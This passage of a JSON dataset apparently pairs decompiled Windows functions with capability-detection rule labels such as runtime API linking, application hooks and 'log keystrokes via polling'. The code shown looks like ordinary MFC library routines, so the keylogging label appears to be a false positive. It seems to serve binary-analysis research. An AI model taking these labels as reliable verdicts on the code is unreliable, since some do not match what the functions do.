        "decompiled_code": "\nvoid fcn.00427376(uint param_1, uint param_2)\n\n{\n    uint uVar1;\n    \n    uVar1 = (*_sym.imp.KERNEL32.dll_LockResource)(param_1);\n    fcn.004272f5(uVar1, param_1, 0, param_2);\n    return;\n}\n",
        "token_count": 74
    },
    "00419731": {
        "rules": [
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00419731(int32_t param_1)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    \n    uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"GDI32.DLL\");\n    pcVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1, \"GetLayout\");\n    if (pcVar2 == NULL) {\n        uVar1 = 0xffffffff;\n        (*_sym.imp.KERNEL32.dll_SetLastError)(0x78);\n    }\n    else {\n        uVar1 = (*pcVar2)(*(param_1 + 4));\n    }\n    return uVar1;\n}\n",
        "token_count": 147
    },
    "00419767": {
        "rules": [
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00419767(int32_t param_1)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    int32_t unaff_EDI;\n    uint uVar3;\n    \n    uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"GDI32.DLL\");\n    uVar3 = 0;\n    pcVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1, \"SetLayout\");\n    if (pcVar2 == NULL) {\n        if (unaff_EDI != 0) {\n            uVar3 = 0xffffffff;\n            (*_sym.imp.KERNEL32.dll_SetLastError)(0x78);\n        }\n    }\n    else {\n        uVar3 = (*pcVar2)(*(param_1 + 4), unaff_EDI);\n    }\n    return uVar3;\n}\n",
        "token_count": 189
    },
    "0041b655": {
        "rules": [
            "link function at runtime on Windows",
            "link many functions at runtime"
        ],
        "decompiled_code": "\nbool fcn.0041b655(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    \n    if (*0x4acfe4 != 0) {\n        return *0x4acfd8 != 0;\n    }\n    *0x4acfe8 = fcn.0041b5fd();\n    iVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"USER32\");\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcAddress;\n    if (((((iVar2 != 0) && (*0x4acfc8 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, 0x48bcb4),  *0x4acfc8 != 0)) &&\n         (*0x4acfcc = (*pcVar1)(iVar2, \"MonitorFromWindow\"),  *0x4acfcc != 0)) &&\n        ((*0x4acfd0 = (*pcVar1)(iVar2, \"MonitorFromRect\"),  *0x4acfd0 != 0 &&\n         (*0x4acfd4 = (*pcVar1)(iVar2, \"MonitorFromPoint\"),  *0x4acfd4 != 0)))) &&\n       ((*0x4acfdc = (*pcVar1)(iVar2, \"EnumDisplayMonitors\"),  *0x4acfdc != 0 &&\n        ((*0x4acfd8 = (*pcVar1)(iVar2, \"GetMonitorInfoA\"),  *0x4acfd8 != 0 &&\n         (*0x4acfe0 = (*pcVar1)(iVar2, \"EnumDisplayDevicesA\"),  *0x4acfe0 != 0)))))) {\n        *0x4acfe4 = 1;\n        return true;\n    }\n    *0x4acfc8 = 0;\n    *0x4acfcc = 0;\n    *0x4acfd0 = 0;\n    *0x4acfd4 = 0;\n    *0x4acfd8 = 0;\n    *0x4acfdc = 0;\n    *0x4acfe0 = 0;\n    *0x4acfe4 = 1;\n    return false;\n}\n",
        "token_count": 487
    },
    "00451376": {
        "rules": [
            "log keystrokes via polling"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00451376(uint32_t arg_8h, uint arg_ch)\n\n{\n    code *pcVar1;\n    int16_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    \n    uVar3 = fcn.004225b8();\n    pcVar1 = _sym.imp.USER32.dll_GetKeyState;\n    if ((uVar3 < 0) &&\n       ((((arg_8h & 0xfff0) != 0xf060 ||\n         (((iVar2 = (*_sym.imp.USER32.dll_GetKeyState)(0x73),  iVar2 < 0 && (iVar2 = (*pcVar1)(0x12),  iVar2 < 0)) &&\n          ((uVar3 & 0x100) != 0)))) && (iVar4 = fcn.0041ffce(arg_8h, arg_ch),  iVar4 != 0)))) {\n        return;\n    }\n    fcn.004466ea(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 225
    },
    "0042b042": {
        "rules": [
            "set application hook"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042b042(code **param_1)\n\n{\n    code *pcVar1;\n    \n    pcVar1 = _sym.imp.USER32.dll_UnhookWindowsHookEx;\n    *param_1 = vtable._AFX_THREAD_STATE.0;\n    if (param_1[0xb] != NULL) {\n        (*pcVar1)(param_1[0xb]);\n    }\n    if (param_1[10] != NULL) {\n        (*pcVar1)(param_1[10]);\n    }\n    if (param_1[3] != NULL) {\n        fcn.0045839d(param_1[3]);\n    }\n    return;\n}\n",
        "token_count": 147
    },
    "00444185": {
        "rules": [
            "set application hook"
        ],
        "decompiled_code": "\nvoid fcn.00444185(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    fcn.004440e6();\n    iVar2 = fcn.0042b7b9();\n    if ((*(iVar2 + 4) != 0) && (pcVar1 = *(*(iVar2 + 4) + 0x3c),  pcVar1 != NULL)) {\n        (*pcVar1)(1, 0);\n    }\n    iVar2 = fcn.0042b82c();\n    if ((*(iVar2 + 0x3c) != NULL) && (iVar3 = (**(**(iVar2 + 0x3c) + 0x13c))(),  iVar3 != 0)) {\n        *(iVar2 + 0x3c) = 0;\n    }\n    iVar2 = fcn.0042b206();\n    iVar3 = fcn.0042b7b9();\n    pcVar1 = _sym.imp.USER32.dll_UnhookWindowsHookEx;\n    if (*(iVar3 + 0x14) == '\\0') {\n        if (*(iVar2 + 0x2c) != 0) {\n            (*_sym.imp.USER32.dll_UnhookWindowsHookEx)(*(iVar2 + 0x2c));\n            *(iVar2 + 0x2c) = 0;\n        }\n        if (*(iVar2 + 0x28) != 0) {\n            (*pcVar1)(*(iVar2 + 0x28));\n            *(iVar2 + 0x28) = 0;\n        }\n    }\n    return;\n}\n",
        "token_count": 361
    },
    "00430f84": {
        "rules": [
            "get thread local storage value"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00430f84(uint *param_1)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t unaff_retaddr;\n    \n    puVar1 = param_1 + 7;\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(puVar1);\n    if ((((0 < unaff_retaddr) && (unaff_retaddr < param_1[3])) &&\n        (iVar3 = (*_sym.imp.KERNEL32.dll_TlsGetValue)(*param_1),  iVar3 != 0)) && (unaff_retaddr < *(iVar3 + 8))) {\n        uVar2 = *(*(iVar3 + 0xc) + unaff_retaddr * 4);\n        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(puVar1);\n        return uVar2;\n    }\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(puVar1);\n    return 0;\n}\n",
        "token_count": 214
    }
}